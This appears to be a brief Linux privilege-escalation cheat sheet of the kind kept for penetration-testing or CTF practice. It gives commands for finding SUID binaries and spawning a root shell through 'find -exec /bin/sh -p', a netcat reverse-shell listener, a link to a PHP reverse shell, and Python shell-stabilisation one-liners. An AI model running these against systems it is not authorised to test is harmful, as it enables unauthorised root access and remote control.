# Privilege Escalation

sudo -l

Shows what the user can run as root without needing the root password

## https://gtfobins.github.io/

## SUID executables
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find xxx -exec whoami \;

find . -exec /bin/sh -p \; -quit


## Reverse Shell

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

sudo nc -lvnp 443

## LinPeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS


## 
https://gtfobins.github.io/gtfobins/python/




## Stabilize shell

to stabilize your shell run :

python -c 'import pty; pty.spawn("/bin/bash")'
and

python -c 'import os; os.system("/bin/bash")'
